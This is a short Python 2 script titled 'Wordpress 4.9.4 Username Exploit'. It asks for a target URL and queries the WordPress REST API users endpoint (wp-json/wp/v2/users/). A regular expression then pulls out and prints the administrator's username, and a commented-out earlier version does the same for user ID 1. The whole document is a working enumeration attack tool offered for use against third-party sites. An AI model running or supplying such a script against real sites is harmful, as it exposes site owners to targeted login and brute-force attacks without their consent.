#!/usr/bin/env python
#!-*- coding:utf-8 -*-

import urllib
import json
import re
#OsmanKandemir


#op = raw_input("Target Url : ")
#exp = "/wp-json/wp/v2/users/1"
#url = op + exp
#res = urllib.urlopen(url)
#d = json.loads(res.read())
#print "ID : " + str(d["id"])+"\n"+"Admin username : " + str(d["name"])

print """

	 _ _ _           _                     
	| | | |___ ___ _| |___ ___ ___ ___ ___ 
	| | | | . |  _| . | . |  _| -_|_ -|_ -|
	|_____|___|_| |___|  _|_| |___|___|___|
	                  |_|       

    Name : Wordpress 4.9.4 Username Exploit
    	  Directory : wp-json/wp/v2/users/

      """          

		

op = raw_input("Target Url : ")
exp = "/wp-json/wp/v2/users/"
url = op + exp
res = urllib.urlopen(url)
re1 = res.read()

a = re.search('"name":".+","u',re1)
if a:
	print "\nAdmin Username : "+a.group(0).replace('"name":"',"").replace('","u',"")